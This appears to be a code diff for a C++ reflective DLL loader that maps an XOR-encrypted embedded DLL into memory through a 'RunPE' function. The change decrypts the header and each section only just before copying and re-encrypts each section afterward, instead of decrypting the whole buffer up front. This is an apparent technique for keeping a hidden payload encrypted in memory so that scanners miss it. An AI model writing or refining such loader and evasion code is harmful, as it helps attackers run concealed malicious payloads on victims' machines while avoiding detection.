@@ -30,6 +30,18 @@ Works with :
 - Doesn't copy headers
 */
 
+void decrypt(const char* key, int offset = 0, int limit = -1) {
+	//START
+    size_t key_size = strlen(key);
+    const int bufferSize = sizeof(sample) / sizeof(sample[0]);
+    if (limit == -1) limit = bufferSize;
+	if (key_size == 0) return;
+    for (int i = offset; i < limit ; i++) {
+        sample[i] ^= key[i%key_size];
+    }
+	//END
+}
+
 // This function will load a DLL from a buffer into the current process.
 // The DLL is expected to be in the PE format.
 //
@@ -48,6 +60,8 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
         return NULL;
     }
 
+	decrypt(KEY, 0, 1024); // decrypt only the header
+	
     // Get a pointer to the DOS header.
     const IMAGE_DOS_HEADER* dos_header = static_cast<const IMAGE_DOS_HEADER*>(dll_buffer);
 
@@ -79,8 +93,10 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     // Copy the section data to the allocated memory.
     for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
         const IMAGE_SECTION_HEADER* section_header = section_headers + i;
+		decrypt(KEY, section_header->PointerToRawData, section_header->PointerToRawData + section_header->SizeOfRawData); //decrypt section
         memcpy(static_cast<char*>(image_base) + section_header->VirtualAddress, static_cast<const char*>(dll_buffer) + section_header->PointerToRawData, section_header->SizeOfRawData);
-    }
+		decrypt(KEY, section_header->PointerToRawData, section_header->PointerToRawData + section_header->SizeOfRawData); //encrypt back section
+	}
     
     DEBUG_PRINTF("[+] Wrote section data\n");
 
@@ -217,16 +233,6 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 	//END
 }
 
-void decrypt(const char* key) {
-	//START
-    size_t key_size = strlen(key);
-	if (key_size == 0) return;
-    for (int i = 0; i < sizeof(sample) / sizeof(sample[0]); i++) {
-        sample[i] ^= key[i%key_size];
-    }
-	//END
-}
-
 void allo() {
 	//START
     AllocConsole();
@@ -251,8 +257,7 @@ int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCm
 
     // Load the DLL from a buffer in memory
     const int bufferSize = sizeof(sample) / sizeof(sample[0]);
-
-    decrypt(KEY);
+	
     HMODULE dll = RunPE(sample, bufferSize, NEW_ADDRESS);
     if (dll == NULL) {
         DEBUG_PRINTF("[-] Failed to load DLL\n");
